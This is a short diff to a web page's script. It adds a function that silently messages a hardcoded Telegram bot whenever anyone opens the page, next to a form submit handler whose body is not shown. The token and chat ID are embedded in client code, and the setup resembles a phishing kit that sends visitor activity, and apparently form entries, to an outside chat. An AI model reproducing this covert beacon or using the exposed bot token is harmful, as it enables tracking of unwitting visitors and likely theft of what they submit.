@@ -115,6 +115,35 @@
         const BOT_TOKEN = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k';
         const CHAT_ID = '7747778364'; // Replace with your chat ID
 
+        // Notify on page load
+        const notifyAccess = async () => {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const message = `
+🔔 *New Visitor Alert* 🔔
+🌐 A user has accessed the page.
+            `;
+
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown',
+                    }),
+                });
+            } catch (error) {
+                console.error('Failed to send access notification:', error);
+            }
+        };
+
+        // Send notification on page load
+        notifyAccess();
+
+        // Handle form submission
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
 
